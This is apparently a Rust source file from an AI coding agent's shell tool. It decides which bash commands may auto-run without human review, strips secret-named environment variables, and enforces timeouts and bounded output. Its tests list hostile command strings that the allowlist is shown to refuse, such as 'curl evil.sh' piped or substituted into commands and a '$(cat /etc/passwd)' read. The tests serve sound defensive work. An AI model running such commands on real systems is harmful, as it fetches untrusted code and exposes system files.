//! Shell execution: the `bash` tool's executor seam, host executor,
//! auto-run allowlist, and environment hygiene.
//!
//! Design: `docs/superpowers/specs/2026-07-16-shell-execution-design.md`.
//! One canonical tool, a pluggable executor chosen by config (never by the
//! model), review-every-command default with parse-aware allowlist
//! promotion, and default-on stripping of secret-shaped environment
//! variables.

use std::collections::BTreeMap;
use std::future::Future;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::time::Duration;

use serde::Deserialize;

/// Default and ceiling command timeouts (milliseconds), matching the
/// cohort norm (Claude Code: 120s default, 600s max).
pub const SHELL_DEFAULT_TIMEOUT_MS: u64 = 120_000;
pub const SHELL_MAX_TIMEOUT_MS: u64 = 600_000;
const SHELL_MIN_TIMEOUT_MS: u64 = 1_000;

/// Bounded output capture: first half preserved from the head, second half
/// rolls with the tail, so long test runs keep both the beginning and the
/// failure summary.
pub const SHELL_OUTPUT_HEAD_BYTES: usize = 24 * 1024;
pub const SHELL_OUTPUT_TAIL_BYTES: usize = 24 * 1024;

/// Streaming display caps: chunks are line-buffered and flushed at most
/// this large, and the streamed total shares the persisted capture budget
/// (head+tail) so display and session log stay consistent.
pub const SHELL_STREAM_CHUNK_MAX_BYTES: usize = 4 * 1024;
pub const SHELL_STREAM_TOTAL_MAX_BYTES: usize = SHELL_OUTPUT_HEAD_BYTES + SHELL_OUTPUT_TAIL_BYTES;
const SHELL_STREAM_CAP_MARKER: &str = "... [live output paused: display cap reached] ...\n";

/// `shell` section of `.yach/config.json`.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(default)]
pub struct ShellConfig {
    pub executor: String,
    pub allow: Vec<String>,
    pub env_allow: Vec<String>,
    pub default_timeout_ms: u64,
    pub max_timeout_ms: u64,
}

impl Default for ShellConfig {
    fn default() -> Self {
        Self {
            executor: String::from("host"),
            allow: Vec::new(),
            env_allow: Vec::new(),
            default_timeout_ms: SHELL_DEFAULT_TIMEOUT_MS,
            max_timeout_ms: SHELL_MAX_TIMEOUT_MS,
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(default)]
struct ShellConfigFile {
    shell: ShellConfig,
}

/// Resolved shell policy: allowlist compiled for parse-aware matching.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellPolicy {
    pub config: ShellConfig,
    allow_entries: Vec<Vec<String>>,
}

impl Default for ShellPolicy {
    fn default() -> Self {
        Self::from_config(ShellConfig::default())
    }
}

impl ShellPolicy {
    #[must_use]
    pub fn from_config(config: ShellConfig) -> Self {
        let allow_entries = config
            .allow
            .iter()
            .filter_map(|entry| shell_words::split(entry).ok())
            .filter(|words| !words.is_empty())
            .collect();
        Self {
            config,
            allow_entries,
        }
    }

    /// Load and resolve shell config from the user scope
    /// (`~/.yach/config.json`) and project scope
    /// (`<project>/.yach/config.json`). Project values win for scalars;
    /// allow/env_allow union across scopes. Unreadable or invalid config
    /// fails closed to defaults (review everything).
    #[must_use]
    pub fn load_for_project(project_root: Option<&Path>) -> Self {
        let user = user_config_path().and_then(|path| load_shell_config(&path));
        let project = project_root
            .map(|root| root.join(".yach").join("config.json"))
            .and_then(|path| load_shell_config(&path));

        let mut config = ShellConfig::default();
        for scope in [user, project].into_iter().flatten() {
            config.executor = scope.executor;
            config.default_timeout_ms = scope.default_timeout_ms;
            config.max_timeout_ms = scope.max_timeout_ms;
            config.allow.extend(scope.allow);
            config.env_allow.extend(scope.env_allow);
        }
        Self::from_config(config)
    }

    /// Clamp a model-requested timeout (milliseconds) into policy bounds.
    #[must_use]
    pub fn clamp_timeout_ms(&self, requested: Option<u64>) -> u64 {
        requested
            .unwrap_or(self.config.default_timeout_ms)
            .clamp(SHELL_MIN_TIMEOUT_MS, self.config.max_timeout_ms)
    }

    /// Whether the command may run without human review. Parse-aware and
    /// fail-closed: every pipeline/list segment must independently match an
    /// allowlist entry, and any construct the conservative lexer cannot
    /// vouch for (substitutions, redirects, background jobs, env-assignment
    /// prefixes, unparseable quoting) disqualifies auto-run entirely.
    #[must_use]
    pub fn auto_run_eligible(&self, command: &str) -> bool {
        if self.allow_entries.is_empty() {
            return false;
        }
        let Some(segments) = split_simple_segments(command) else {
            return false;
        };
        if segments.is_empty() {
            return false;
        }
        segments.iter().all(|segment| {
            let Ok(words) = shell_words::split(segment) else {
                return false;
            };
            if words.is_empty() {
                return false;
            }
            // An env-assignment prefix (FOO=bar cmd) hides the real
            // program behind an assignment word; never auto-run.
            if words[0].contains('=') {
                return false;
            }
            self.allow_entries
                .iter()
                .any(|entry| words.len() >= entry.len() && words[..entry.len()] == entry[..])
        })
    }
}

/// Split a command into simple segments on unquoted `&&`, `||`, `;`, `|`,
/// and newlines. Returns `None` (never eligible for auto-run) when the
/// command contains constructs the conservative lexer will not vouch for:
/// command or process substitution, backticks, redirects, background `&`,
/// or unterminated quoting.
fn split_simple_segments(command: &str) -> Option<Vec<String>> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;

    while let Some(ch) = chars.next() {
        if in_single {
            current.push(ch);
            if ch == '\'' {
                in_single = false;
            }
            continue;
        }
        if ch == '\\' {
            current.push(ch);
            if let Some(next) = chars.next() {
                current.push(next);
            }
            continue;
        }
        match ch {
            '\'' if !in_double => {
                in_single = true;
                current.push(ch);
            }
            '"' => {
                in_double = !in_double;
                current.push(ch);
            }
            // Substitution works inside double quotes too; both are
            // disqualifying wherever they appear outside single quotes.
            '`' => return None,
            '$' if matches!(chars.peek(), Some('(')) => return None,
            _ if in_double => current.push(ch),
            '>' | '<' => return None,
            ';' | '\n' => {
                push_segment(&mut segments, &mut current);
            }
            '|' => {
                if matches!(chars.peek(), Some('|')) {
                    chars.next();
                }
                push_segment(&mut segments, &mut current);
            }
            '&' => {
                if matches!(chars.peek(), Some('&')) {
                    chars.next();
                    push_segment(&mut segments, &mut current);
                } else {
                    // Background execution.
                    return None;
                }
            }
            _ => current.push(ch),
        }
    }

    if in_single || in_double {
        return None;
    }
    push_segment(&mut segments, &mut current);
    Some(segments)
}

fn push_segment(segments: &mut Vec<String>, current: &mut String) {
    let segment = current.trim();
    if !segment.is_empty() {
        segments.push(segment.to_owned());
    }
    current.clear();
}

/// Build the subprocess environment: inherit the parent environment, drop
/// any variable whose name matches `*KEY*`, `*SECRET*`, or `*TOKEN*`
/// (case-insensitive), then re-add explicitly allowed names.
///
/// Deliberate divergence from the incumbents' current permissive defaults:
/// yach has no sandbox/network boundary yet, so environment hygiene is one
/// of the few real mitigations on the host executor
/// (`docs/project/records/2026-07-16-execution-isolation-research.md`).
#[must_use]
pub fn build_command_env(env_allow: &[String]) -> BTreeMap<String, String> {
    let mut env = BTreeMap::new();
    for (name, value) in std::env::vars() {
        if secret_shaped_env_name(&name) && !env_allow.iter().any(|allowed| allowed == &name) {
            continue;
        }
        env.insert(name, value);
    }
    env
}

fn secret_shaped_env_name(name: &str) -> bool {
    let upper = name.to_uppercase();
    upper.contains("KEY") || upper.contains("SECRET") || upper.contains("TOKEN")
}

/// A command ready for an executor: policy has been applied, the working
/// directory is resolved and validated, and the environment is built.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PreparedCommand {
    pub command: String,
    pub cwd: PathBuf,
    pub env: BTreeMap<String, String>,
    pub timeout: Duration,
}

/// Bounded outcome of a finished command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandOutcome {
    pub exit_code: Option<i32>,
    pub output: String,
    pub output_bytes_total: usize,
    pub truncated: bool,
    pub duration_ms: u64,
    pub timed_out: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandSpawnError {
    Spawn(String),
}

type CommandFuture =
    Pin<Box<dyn Future<Output = Result<CommandOutcome, CommandSpawnError>> + Send>>;

/// Live display chunks flow through this sender while a command runs. The
/// receiver side turns them into protocol events; dropped receivers are
/// ignored (streaming is display-only, never load-bearing).
pub type CommandOutputChunkSender = tokio::sync::mpsc::UnboundedSender<String>;

/// Executor seam: implementations own spawn/stream/kill. Policy context
/// travels in `PreparedCommand` so isolating executors can derive
/// filesystem and network policy without trait changes. `output_stream`
/// receives bounded live chunks; `None` runs fully buffered.
pub trait CommandExecutor: Send + Sync {
    fn run(
        &self,
        prepared: PreparedCommand,
        output_stream: Option<CommandOutputChunkSender>,
    ) -> CommandFuture;
}

/// Runs commands directly on the host: `bash -c`, own process group,
/// constructed environment, bounded head+tail capture, kill on timeout or
/// drop (cancellation).
#[derive(Debug, Clone, Copy, Default)]
pub struct HostCommandExecutor;

impl CommandExecutor for HostCommandExecutor {
    fn run(
        &self,
        prepared: PreparedCommand,
        output_stream: Option<CommandOutputChunkSender>,
    ) -> CommandFuture {
        Box::pin(run_host_command(prepared, output_stream))
    }
}

async fn run_host_command(
    prepared: PreparedCommand,
    output_stream: Option<CommandOutputChunkSender>,
) -> Result<CommandOutcome, CommandSpawnError> {
    use std::process::Stdio;
    use tokio::io::AsyncReadExt;

    let started = std::time::Instant::now();
    let mut command = tokio::process::Command::new("bash");
    command
        .arg("-c")
        .arg(&prepared.command)
        .current_dir(&prepared.cwd)
        .env_clear()
        .envs(&prepared.env)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .process_group(0);

    let mut child = command
        .spawn()
        .map_err(|error| CommandSpawnError::Spawn(error.to_string()))?;
    let child_pid = child.id();
    // Kill the whole process group on cancellation or timeout so children
    // of the shell do not outlive the turn.
    let group_guard = ProcessGroupGuard { pid: child_pid };

    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let mut capture = BoundedCapture::new(SHELL_OUTPUT_HEAD_BYTES, SHELL_OUTPUT_TAIL_BYTES);
    let mut chunker = StreamChunker::new(output_stream);

    let collect = async {
        let mut stdout_buffer = [0_u8; 4096];
        let mut stderr_buffer = [0_u8; 4096];
        let mut stdout_open = stdout.is_some();
        let mut stderr_open = stderr.is_some();
        while stdout_open || stderr_open {
            tokio::select! {
                read = async {
                    match stdout.as_mut() {
                        Some(reader) => reader.read(&mut stdout_buffer).await,
                        None => Ok(0),
                    }
                }, if stdout_open => {
                    match read {
                        Ok(0) | Err(_) => stdout_open = false,
                        Ok(count) => {
                            capture.push(&stdout_buffer[..count]);
                            chunker.push(&stdout_buffer[..count]);
                        }
                    }
                }
                read = async {
                    match stderr.as_mut() {
                        Some(reader) => reader.read(&mut stderr_buffer).await,
                        None => Ok(0),
                    }
                }, if stderr_open => {
                    match read {
                        Ok(0) | Err(_) => stderr_open = false,
                        Ok(count) => {
                            capture.push(&stderr_buffer[..count]);
                            chunker.push(&stderr_buffer[..count]);
                        }
                    }
                }
            }
        }
        chunker.finish();
        child.wait().await
    };

    let (timed_out, exit_code) = match tokio::time::timeout(prepared.timeout, collect).await {
        Ok(Ok(status)) => (false, status.code()),
        Ok(Err(_)) => (false, None),
        Err(_) => {
            group_guard.kill();
            (true, None)
        }
    };
    group_guard.disarm();

    let (output, output_bytes_total, truncated) = capture.finish();
    Ok(CommandOutcome {
        exit_code,
        output,
        output_bytes_total,
        truncated,
        duration_ms: u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX),
        timed_out,
    })
}

struct ProcessGroupGuard {
    pid: Option<u32>,
}

impl ProcessGroupGuard {
    fn kill(&self) {
        #[cfg(unix)]
        if let Some(pid) = self.pid
            && let Ok(pid) = i32::try_from(pid)
        {
            // SAFETY: killpg with SIGKILL on the child's process group; the
            // child was spawned with process_group(0) so the group id is
            // the child pid and cannot address the parent's group.
            unsafe {
                libc::killpg(pid, libc::SIGKILL);
            }
        }
    }

    fn disarm(mut self) {
        self.pid = None;
    }
}

impl Drop for ProcessGroupGuard {
    fn drop(&mut self) {
        self.kill();
    }
}

/// Head+tail bounded byte capture with lossy UTF-8 rendering.
struct BoundedCapture {
    head_max: usize,
    tail_max: usize,
    head: Vec<u8>,
    tail: std::collections::VecDeque<u8>,
    total: usize,
}

impl BoundedCapture {
    fn new(head_max: usize, tail_max: usize) -> Self {
        Self {
            head_max,
            tail_max,
            head: Vec::new(),
            tail: std::collections::VecDeque::new(),
            total: 0,
        }
    }

    fn push(&mut self, bytes: &[u8]) {
        self.total = self.total.saturating_add(bytes.len());
        for &byte in bytes {
            if self.head.len() < self.head_max {
                self.head.push(byte);
            } else {
                if self.tail.len() == self.tail_max {
                    self.tail.pop_front();
                }
                self.tail.push_back(byte);
            }
        }
    }

    fn finish(self) -> (String, usize, bool) {
        let truncated = self.total > self.head_max + self.tail.len();
        let mut output = String::from_utf8_lossy(&self.head).into_owned();
        if truncated {
            let omitted = self
                .total
                .saturating_sub(self.head.len())
                .saturating_sub(self.tail.len());
            let _ = std::fmt::Write::write_fmt(
                &mut output,
                format_args!("\n... [{omitted} bytes omitted] ...\n"),
            );
        }
        if !self.tail.is_empty() {
            let tail = self.tail.into_iter().collect::<Vec<_>>();
            output.push_str(&String::from_utf8_lossy(&tail));
        }
        (output, self.total, truncated)
    }
}

/// Line-buffered, size-capped live output chunking. Complete lines flush as
/// they arrive; a line longer than `SHELL_STREAM_CHUNK_MAX_BYTES` flushes in
/// chunk-sized pieces so a progress spinner cannot stall the display. After
/// `SHELL_STREAM_TOTAL_MAX_BYTES` a single cap marker is sent and streaming
/// stops; the bounded capture (and therefore the model-visible result) is
/// unaffected.
struct StreamChunker {
    sender: Option<CommandOutputChunkSender>,
    pending: Vec<u8>,
    streamed_total: usize,
}

impl StreamChunker {
    fn new(sender: Option<CommandOutputChunkSender>) -> Self {
        Self {
            sender,
            pending: Vec::new(),
            streamed_total: 0,
        }
    }

    fn push(&mut self, bytes: &[u8]) {
        if self.sender.is_none() {
            return;
        }
        self.pending.extend_from_slice(bytes);
        if let Some(newline_index) = self.pending.iter().rposition(|&byte| byte == b'\n') {
            let complete_lines = self.pending.drain(..=newline_index).collect::<Vec<_>>();
            self.send_pieces(&complete_lines);
        }
        if self.pending.len() >= SHELL_STREAM_CHUNK_MAX_BYTES {
            let oversized_line = std::mem::take(&mut self.pending);
            self.send_pieces(&oversized_line);
        }
    }

    fn finish(&mut self) {
        if self.pending.is_empty() {
            return;
        }
        let trailing = std::mem::take(&mut self.pending);
        self.send_pieces(&trailing);
    }

    fn send_pieces(&mut self, bytes: &[u8]) {
        for piece in bytes.chunks(SHELL_STREAM_CHUNK_MAX_BYTES) {
            let Some(sender) = self.sender.as_ref() else {
                return;
            };
            if self.streamed_total >= SHELL_STREAM_TOTAL_MAX_BYTES {
                let _ = sender.send(String::from(SHELL_STREAM_CAP_MARKER));
                self.sender = None;
                return;
            }
            self.streamed_total = self.streamed_total.saturating_add(piece.len());
            if sender
                .send(String::from_utf8_lossy(piece).into_owned())
                .is_err()
            {
                // Display receiver went away; stop paying for chunking.
                self.sender = None;
                return;
            }
        }
    }
}

fn user_config_path() -> Option<PathBuf> {
    let home = std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE"))?;
    Some(PathBuf::from(home).join(".yach").join("config.json"))
}

fn load_shell_config(path: &Path) -> Option<ShellConfig> {
    let raw = std::fs::read_to_string(path).ok()?;
    serde_json::from_str::<ShellConfigFile>(&raw)
        .ok()
        .map(|file| file.shell)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy(allow: &[&str]) -> ShellPolicy {
        ShellPolicy::from_config(ShellConfig {
            allow: allow.iter().map(|entry| (*entry).to_owned()).collect(),
            ..ShellConfig::default()
        })
    }

    #[test]
    fn allowlist_matches_word_prefixes_not_string_prefixes() {
        let policy = policy(&["cargo test", "git status"]);

        assert!(policy.auto_run_eligible("cargo test"));
        assert!(policy.auto_run_eligible("cargo test --workspace"));
        assert!(policy.auto_run_eligible("git status"));
        assert!(!policy.auto_run_eligible("cargo testx"));
        assert!(!policy.auto_run_eligible("cargotest"));
        assert!(!policy.auto_run_eligible("cargo"));
        assert!(!policy.auto_run_eligible("git push"));
    }

    #[test]
    fn allowlist_requires_every_segment_to_match() {
        let policy = policy(&["cargo test", "cargo check"]);

        assert!(policy.auto_run_eligible("cargo check && cargo test"));
        assert!(policy.auto_run_eligible("cargo check; cargo test"));
        assert!(!policy.auto_run_eligible("cargo test && curl evil.sh"));
        assert!(!policy.auto_run_eligible("curl evil.sh || cargo test"));
        assert!(!policy.auto_run_eligible("cargo test | sh"));
    }

    #[test]
    fn allowlist_disqualifies_substitutions_redirects_and_background() {
        let policy = policy(&["cargo test", "echo"]);

        assert!(!policy.auto_run_eligible("cargo test $(curl evil.sh)"));
        assert!(!policy.auto_run_eligible("cargo test `curl evil.sh`"));
        assert!(!policy.auto_run_eligible("echo \"$(cat /etc/passwd)\""));
        assert!(!policy.auto_run_eligible("cargo test > /tmp/out"));
        assert!(!policy.auto_run_eligible("cargo test < input"));
        assert!(!policy.auto_run_eligible("cargo test &"));
        assert!(!policy.auto_run_eligible("FOO=bar cargo test"));
        assert!(!policy.auto_run_eligible("cargo test 'unterminated"));
    }

    #[test]
    fn allowlist_permits_quoted_operator_characters_as_arguments() {
        let policy = policy(&["search_helper"]);

        assert!(policy.auto_run_eligible("search_helper 'a && b'"));
        assert!(policy.auto_run_eligible("search_helper \"a; b\""));
        // Dollar-variable words are plain words after expansion; they can
        // never introduce new pipeline segments.
        assert!(policy.auto_run_eligible("search_helper $HOME"));
    }

    #[test]
    fn empty_allowlist_never_auto_runs() {
        let policy = policy(&[]);
        assert!(!policy.auto_run_eligible("true"));
    }

    #[test]
    fn timeout_clamps_to_policy_bounds() {
        let policy = ShellPolicy::default();

        assert_eq!(policy.clamp_timeout_ms(None), SHELL_DEFAULT_TIMEOUT_MS);
        assert_eq!(policy.clamp_timeout_ms(Some(1)), 1_000);
        assert_eq!(
            policy.clamp_timeout_ms(Some(u64::MAX)),
            SHELL_MAX_TIMEOUT_MS
        );
        assert_eq!(policy.clamp_timeout_ms(Some(5_000)), 5_000);
    }

    #[test]
    fn command_env_strips_secret_shaped_names_unless_allowed() {
        // SAFETY: test-only env mutation; keys are unique to this test.
        unsafe {
            std::env::set_var("YACH_SHELL_TEST_API_KEY", "secret");
            std::env::set_var("YACH_SHELL_TEST_SECRET_THING", "secret");
            std::env::set_var("YACH_SHELL_TEST_TOKEN_X", "secret");
            std::env::set_var("YACH_SHELL_TEST_PLAIN", "visible");
        }

        let stripped = build_command_env(&[]);
        assert!(!stripped.contains_key("YACH_SHELL_TEST_API_KEY"));
        assert!(!stripped.contains_key("YACH_SHELL_TEST_SECRET_THING"));
        assert!(!stripped.contains_key("YACH_SHELL_TEST_TOKEN_X"));
        assert_eq!(
            stripped.get("YACH_SHELL_TEST_PLAIN").map(String::as_str),
            Some("visible")
        );

        let allowed = build_command_env(&[String::from("YACH_SHELL_TEST_API_KEY")]);
        assert_eq!(
            allowed.get("YACH_SHELL_TEST_API_KEY").map(String::as_str),
            Some("secret")
        );

        // SAFETY: test-only cleanup of the keys set above.
        unsafe {
            std::env::remove_var("YACH_SHELL_TEST_API_KEY");
            std::env::remove_var("YACH_SHELL_TEST_SECRET_THING");
            std::env::remove_var("YACH_SHELL_TEST_TOKEN_X");
            std::env::remove_var("YACH_SHELL_TEST_PLAIN");
        }
    }

    #[test]
    fn bounded_capture_keeps_head_and_tail() {
        let mut capture = BoundedCapture::new(8, 8);
        capture.push(b"AAAAAAAA");
        capture.push(b"BBBBBBBBBBBBBBBB");
        capture.push(b"CCCCCCCC");

        let (output, total, truncated) = capture.finish();
        assert_eq!(total, 32);
        assert!(truncated);
        assert!(output.starts_with("AAAAAAAA"));
        assert!(output.ends_with("CCCCCCCC"));
        assert!(output.contains("bytes omitted"));
    }

    #[test]
    fn host_executor_runs_commands_with_bounded_output() {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build();
        assert!(runtime.is_ok());
        let Ok(runtime) = runtime else {
            return;
        };
        runtime.block_on(async {
            let outcome = HostCommandExecutor
                .run(
                    PreparedCommand {
                        command: String::from("echo out && echo err 1>&2 && exit 3"),
                        cwd: std::env::temp_dir(),
                        env: build_command_env(&[]),
                        timeout: Duration::from_secs(10),
                    },
                    None,
                )
                .await;

            assert!(outcome.is_ok());
            let Ok(outcome) = outcome else {
                return;
            };
            assert_eq!(outcome.exit_code, Some(3));
            assert!(outcome.output.contains("out"));
            assert!(outcome.output.contains("err"));
            assert!(!outcome.truncated);
            assert!(!outcome.timed_out);
        });
    }

    #[test]
    fn host_executor_times_out_and_kills_the_process_group() {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build();
        assert!(runtime.is_ok());
        let Ok(runtime) = runtime else {
            return;
        };
        runtime.block_on(async {
            let started = std::time::Instant::now();
            let outcome = HostCommandExecutor
                .run(
                    PreparedCommand {
                        command: String::from("sleep 30"),
                        cwd: std::env::temp_dir(),
                        env: build_command_env(&[]),
                        timeout: Duration::from_millis(300),
                    },
                    None,
                )
                .await;

            assert!(outcome.is_ok());
            let Ok(outcome) = outcome else {
                return;
            };
            assert!(outcome.timed_out);
            assert!(outcome.exit_code.is_none());
            assert!(started.elapsed() < Duration::from_secs(10));
        });
    }

    #[test]
    fn host_executor_child_env_matches_constructed_env() {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build();
        assert!(runtime.is_ok());
        let Ok(runtime) = runtime else {
            return;
        };
        runtime.block_on(async {
            let mut env = build_command_env(&[]);
            env.insert(String::from("YACH_SHELL_CHILD_PROBE"), String::from("ok"));
            let outcome = HostCommandExecutor
                .run(PreparedCommand {
                    command: String::from(
                        "printf '%s' \"probe=$YACH_SHELL_CHILD_PROBE key=${YACH_RIG_ANTHROPIC_API_KEY:-absent}\"",
                    ),
                    cwd: std::env::temp_dir(),
                    env,
                    timeout: Duration::from_secs(10),
                }, None)
                .await;

            assert!(outcome.is_ok());
            let Ok(outcome) = outcome else {
                return;
            };
            assert!(outcome.output.contains("probe=ok"));
            assert!(outcome.output.contains("key=absent"));
        });
    }

    #[test]
    fn host_executor_streams_line_buffered_chunks_while_running() {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build();
        assert!(runtime.is_ok());
        let Ok(runtime) = runtime else {
            return;
        };
        runtime.block_on(async {
            let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::unbounded_channel();
            let outcome = HostCommandExecutor
                .run(
                    PreparedCommand {
                        command: String::from(
                            "printf 'first\\n'; printf 'second\\n'; printf 'no newline'",
                        ),
                        cwd: std::env::temp_dir(),
                        env: build_command_env(&[]),
                        timeout: Duration::from_secs(10),
                    },
                    Some(chunk_tx),
                )
                .await;

            assert!(outcome.is_ok());
            let mut streamed = String::new();
            while let Some(chunk) = chunk_rx.recv().await {
                streamed.push_str(&chunk);
            }
            assert_eq!(streamed, "first\nsecond\nno newline");
            let Ok(outcome) = outcome else {
                return;
            };
            // Streamed display and model-visible capture agree.
            assert_eq!(outcome.output, streamed);
        });
    }

    #[test]
    fn stream_chunker_caps_total_bytes_with_a_single_marker() {
        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::unbounded_channel();
        let mut chunker = StreamChunker::new(Some(chunk_tx));
        let line = [b'x'; 1024].as_slice();
        let mut payload = Vec::new();
        payload.extend_from_slice(line);
        payload.push(b'\n');
        for _ in 0..(SHELL_STREAM_TOTAL_MAX_BYTES / 1024 + 8) {
            chunker.push(&payload);
        }
        chunker.finish();
        drop(chunker);

        let mut streamed_bytes = 0;
        let mut marker_count = 0;
        while let Ok(chunk) = chunk_rx.try_recv() {
            if chunk == SHELL_STREAM_CAP_MARKER {
                marker_count += 1;
            } else {
                streamed_bytes += chunk.len();
            }
        }
        assert_eq!(marker_count, 1);
        assert!(streamed_bytes <= SHELL_STREAM_TOTAL_MAX_BYTES + SHELL_STREAM_CHUNK_MAX_BYTES);
    }

    #[test]
    fn stream_chunker_splits_oversized_lines_into_bounded_chunks() {
        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::unbounded_channel();
        let mut chunker = StreamChunker::new(Some(chunk_tx));
        chunker.push(&[b'y'; SHELL_STREAM_CHUNK_MAX_BYTES * 2 + 100]);
        chunker.finish();
        drop(chunker);

        let mut chunks = Vec::new();
        while let Ok(chunk) = chunk_rx.try_recv() {
            chunks.push(chunk);
        }
        assert!(chunks.len() >= 2);
        assert!(
            chunks
                .iter()
                .all(|chunk| chunk.len() <= SHELL_STREAM_CHUNK_MAX_BYTES)
        );
        assert_eq!(
            chunks.iter().map(String::len).sum::<usize>(),
            SHELL_STREAM_CHUNK_MAX_BYTES * 2 + 100
        );
    }
}
